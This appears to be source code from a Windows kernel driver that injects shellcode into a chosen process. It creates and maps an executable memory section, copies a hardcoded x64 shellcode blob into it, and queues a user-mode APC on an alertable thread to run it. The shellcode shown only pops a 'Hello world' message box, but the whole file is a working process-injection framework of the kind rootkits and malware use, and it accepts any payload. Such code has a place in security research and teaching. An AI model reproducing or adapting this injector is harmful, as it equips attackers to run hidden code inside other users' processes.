#include "CodeInjection.hpp"
#pragma warning(disable : 6387)
#pragma warning(disable : 6001)
#define CODE_INJECTION_TAG 'edoC'


namespace CodeInjection {

	char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

	SIZE_T SectionSize = 102400;

	auto Injection(_In_ ULONG Pid) -> NTSTATUS {
		//__debugbreak();
		if (Pid == 0)	return STATUS_INVALID_PARAMETER_1;

		PEPROCESS Eprocess{};
		KAPC_STATE apc_state{};
		auto ns = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(Pid), &Eprocess);
		if (!NT_SUCCESS(ns)) {
			DbgPrint("[-] Failed to get Eprocess pointer to Pid : %x\n", Pid);
			if (ns == STATUS_INVALID_PARAMETER)	DbgPrint("[-] Invalid PID passed\n");
			else if (ns == STATUS_INVALID_CID)	DbgPrint("[-] Invalid CID passed\n");

			DbgPrint("[-] Exiting with error code : %x\n", ns);
			return ns;
		}

		//KeAcquireGuardedMutex(&g_GuardedMutex);
		auto Kprocess = static_cast<_KPROCESS*>(Eprocess);
		KeStackAttachProcess(Kprocess, &apc_state);

		PerformInjection(Pid);

		KeUnstackDetachProcess(&apc_state);
		//KeReleaseGuardedMutex(&g_GuardedMutex);

		ObDereferenceObject(Eprocess);
		return STATUS_SUCCESS;
	}


	auto PerformInjection(_In_ ULONG pid) -> NTSTATUS {
		HANDLE SectionHandle = nullptr;
		HANDLE RemoteProcessHandle = nullptr;
		HANDLE CurrentProcessHandle = nullptr;
		PVOID RemoteProcessBase = nullptr;
		PVOID CurrentProcessBase = nullptr;

		auto ns = OpenProcess(pid, &RemoteProcessHandle);
		if (!NT_SUCCESS(ns) || RemoteProcessHandle == nullptr)		goto _exit;
		DbgPrint("[+] Opened handle to pid(%x) : %llx\n", pid, reinterpret_cast<uintptr_t>(RemoteProcessHandle));

		
		DbgPrint("[+] Creating Section Handle ....\n");
		ns = CreateSection(&SectionHandle); 
		if (!NT_SUCCESS(ns) || SectionHandle == nullptr)	goto _exit;

		DbgPrint("[+] Created section with handle : %llx\n", reinterpret_cast<uintptr_t>(SectionHandle));
		DbgPrint("[+] Mapping Section to remote process image base ...\n");

		ns = MapSection(SectionHandle, RemoteProcessHandle, &RemoteProcessBase, true);
		if (!NT_SUCCESS(ns) || RemoteProcessBase == nullptr)	goto _exit;

		DbgPrint("[+] Mapped remote process base at 0x%llx\n", reinterpret_cast<uintptr_t>(RemoteProcessBase));
		DbgPrint("[+] Mapping section to current process image base ...\n");

		CurrentProcessHandle = ZwCurrentProcess();
		ns = MapSection(SectionHandle, CurrentProcessHandle, &CurrentProcessBase, false);
		if (!NT_SUCCESS(ns) || CurrentProcessBase == nullptr)	goto _exit;

		DbgPrint("[+] Mapped current process base at 0x%llx\n", reinterpret_cast<uintptr_t>(CurrentProcessBase));
		DbgPrint("[+] Copying shellcode to current process base ...\n");

		RtlCopyMemory(CurrentProcessBase, shellcode, sizeof(shellcode));

		// Perform APC Injection
		ULONG ReturnLength = 0;

		ns = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength);
		if (ns != STATUS_INFO_LENGTH_MISMATCH)	goto _exit;

		auto buffer = ExAllocatePoolWithTag(NonPagedPool, ReturnLength, CODE_INJECTION_TAG);
		if (buffer == nullptr)	goto _exit;
		DbgPrint("[+] SystemInformation : %llx\n", reinterpret_cast<uintptr_t>(buffer));

		ns = ZwQuerySystemInformation(SystemProcessInformation, buffer, ReturnLength, &ReturnLength);
		if (!NT_SUCCESS(ns)) {
			DbgPrint("[-] ZwQuerySystemInformation failed with error code : %x.\n", ns);	
			goto _exit;
		}

		auto SystemInformation = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(buffer);

		UNICODE_STRING usString;
		RtlInitUnicodeString(&usString, L"notepad.exe");

		do {
			//DbgPrint("\t[*] PID : %p\n", static_cast<PVOID>(SystemInformation->UniqueProcessId));
			if (SystemInformation->UniqueProcessId == reinterpret_cast<HANDLE>(pid)) {
				DbgPrint("[+] Got matching PID \n");
				for (ULONG idx = 0; idx < SystemInformation->NumberOfThreads; idx++) {
					auto threads = &SystemInformation->Threads[idx];
					if (threads->State == StateWait) {
						DbgPrint("[+] Got state wait.\n");
						auto threadId = threads->ClientId.UniqueThread;
						PETHREAD ThreadObject{};
						ns = PsLookupThreadByThreadId(threadId, static_cast<PETHREAD*>(&ThreadObject));
						if (NT_SUCCESS(ns)) {
							DbgPrint("[+] ThreadId(%p) with Ethread : %llx\n", threadId, reinterpret_cast<uintptr_t>(ThreadObject));
							if (ThreadObject->Alertable) {
								DbgPrint("[+] Alertable \n");
								ns = PerformApcInjection(ThreadObject, RemoteProcessBase);
								if (NT_SUCCESS(ns)) {
									ZwWaitForSingleObject(ThreadObject, TRUE, nullptr);
									ObDereferenceObject(ThreadObject);
									break;
								}
							}
						}
						//ObDereferenceObject(ThreadObject);
						continue;
					}
					continue;
				}
			}	

			SystemInformation = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>
				((UCHAR*)SystemInformation + SystemInformation->NextEntryOffset);
		} while (SystemInformation->NextEntryOffset != 0);
		ExFreePoolWithTag(buffer, CODE_INJECTION_TAG);

		DbgPrint("\n\n ================================================================\n\n\n");
		

	_exit:
		if (CurrentProcessBase)		ZwUnmapViewOfSection(CurrentProcessHandle, CurrentProcessBase);
		if (RemoteProcessBase)		ZwUnmapViewOfSection(RemoteProcessHandle, RemoteProcessBase);
		if (CurrentProcessHandle)	ZwClose(CurrentProcessHandle);
		if (RemoteProcessHandle)	ZwClose(RemoteProcessHandle);
		if (SectionHandle)			ZwClose(SectionHandle);				

		return ns;
	}


	auto CreateSection(_Out_ HANDLE* hSec) -> NTSTATUS {
		LARGE_INTEGER li{};
		li.QuadPart = SectionSize;
		OBJECT_ATTRIBUTES oa{};
		InitializeObjectAttributes(&oa, nullptr, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

		auto ns = ZwCreateSection(hSec, SECTION_ALL_ACCESS, &oa, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
		if (!NT_SUCCESS(ns))	DbgPrint("[-] ZwCreateSection failed with error code : %x\n", ns);

		return ns;
	}


	auto  MapSection(_In_ HANDLE hSec, _In_ HANDLE hHandle, _Out_ PVOID* base, _In_ BOOLEAN Remote) -> NTSTATUS {
		
		if (hSec == nullptr || hHandle == nullptr)	return STATUS_UNSUCCESSFUL;
		if (*base != nullptr)	ZwUnmapViewOfSection(hHandle, *base);

		LARGE_INTEGER SectionOffset{};
		SectionOffset.QuadPart = SectionSize;
		SIZE_T size = 0;

		auto ns = ZwMapViewOfSection(hSec, hHandle, base, 0, /*SectionSize*/ 0, nullptr, /*&SectionSize*/ &size, ViewUnmap,
			0, Remote ? PAGE_EXECUTE_READ : PAGE_READWRITE);
		if (!NT_SUCCESS(ns))	DbgPrint("[-] ZwMapViewOfSection failed with error code : %x\n", ns);

		return ns;
	}


	auto OpenProcess(_In_ ULONG pid, _Out_ HANDLE* hProc) -> NTSTATUS {
		CLIENT_ID cid{};
		cid.UniqueProcess = reinterpret_cast<HANDLE>(pid);

		OBJECT_ATTRIBUTES oa{};
		InitializeObjectAttributes(&oa, nullptr, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);

		auto ns = ZwOpenProcess(hProc, PROCESS_ALL_ACCESS, &oa, &cid);
		if (!NT_SUCCESS(ns))	DbgPrint("[-] ZwOpenProcess failed.\n");

		return ns;
	}


	auto PerformApcInjection(_In_ PETHREAD Ethread, _In_ PVOID NormalRoutine) -> NTSTATUS {
		auto apc = reinterpret_cast<KAPC*>(ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), CODE_INJECTION_TAG));
		if (apc == nullptr)	return STATUS_INSUFFICIENT_RESOURCES;

		KeInitializeApc(apc, Ethread, OriginalApcEnvironment, ApcKernelRoutine, nullptr, /*ApcNormalRoutine*/ 
			reinterpret_cast<PKNORMAL_ROUTINE>(NormalRoutine), UserMode, nullptr);
		if (KeInsertQueueApc(apc, nullptr, nullptr, IO_NO_INCREMENT)) {
			DbgPrint("[+] Done with APC Injection !!!\n");
			return STATUS_SUCCESS;
		}
		else {
			DbgPrint("[+] Failed APC Injection!!!\n");
			return STATUS_UNSUCCESSFUL;
		}
	}


	auto ApcKernelRoutine(_In_ PKAPC Apc, _Inout_ PKNORMAL_ROUTINE*, _Inout_ PVOID*, _Inout_ PVOID*, _Inout_ PVOID*) -> void {
		if (Apc)	ExFreePoolWithTag(Apc, CODE_INJECTION_TAG);
		return;
	}


	auto ApcNormalRoutine(_In_ PVOID NormalContext, _In_ PVOID, _In_ PVOID) -> void {
		UNREFERENCED_PARAMETER(NormalContext);
	}
}